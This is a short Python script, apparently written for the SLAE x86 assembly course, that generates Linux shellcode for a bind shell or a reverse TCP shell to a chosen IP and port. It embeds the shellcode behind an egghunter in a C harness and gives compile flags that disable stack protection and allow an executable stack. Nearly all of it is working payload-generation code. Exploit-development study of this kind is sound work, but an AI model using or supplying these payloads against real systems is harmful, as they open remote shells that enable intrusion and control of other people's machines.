# Paolo Stagno aka [VoidSec](https://voidsec.com)
# SLAE-1511
#!/usr/bin/env python

import sys;
if (len(sys.argv) != 5):
	print ("usage: " + sys.argv[0] + " ip port payload egg");
	sys.exit(-1)
else:	
	ip = sys.argv[1]
	hip = "\\x"+"\\x".join([hex(int(x)+256)[3:] for x in ip.split('.')])
	port = int(sys.argv[2])
	if port < 0 or port > 65535:
		print "[!] Invalid TCP port number {}, must be between 0-65535".format(port)
		sys.exit(-1)
	
# convert to hex and strip 0x
hport=hex(port).strip("0x")
# add an \\x every 2 chars
hport="\\x"+"\\x".join(a+b for a,b in zip(hport[::2],hport[1::2]))

payload=sys.argv[3]
egg=sys.argv[4]
eggx2=egg*2

if payload=="bind":
    shellcode= "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00{}\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80".format(hport)
else:
    shellcode="\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68{}\\x68\\x02\\x00{}\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80".format(hip,hport)

print "{} TCP shellcode connecting to {}:{}".format(payload,ip,port)
# print "\n"+shellcode

c_code=r"""
#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = \
"\xbb{}\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

unsigned char egg[] = \
"{}" // egg signature (\x90\x50\x90\x50\x90\x50\x90\x50)
"{}";

void main()
{{
    printf("Egg hunter length: %d\n", strlen(egghunter));
    printf("Shellcode length: %d (%d + 4 byte egg)\n", strlen(egg), strlen(egg)-4);
    int (*ret)() = (int(*)())egghunter;
    ret();
}}
""".format(egg,eggx2,shellcode)

f = open("egg_shellcode.c", "w")
f.write(c_code)
f.close()
print("Compile it with: gcc -m32 -fno-stack-protector -z execstack egg_shellcode.c -o egg_shellcode")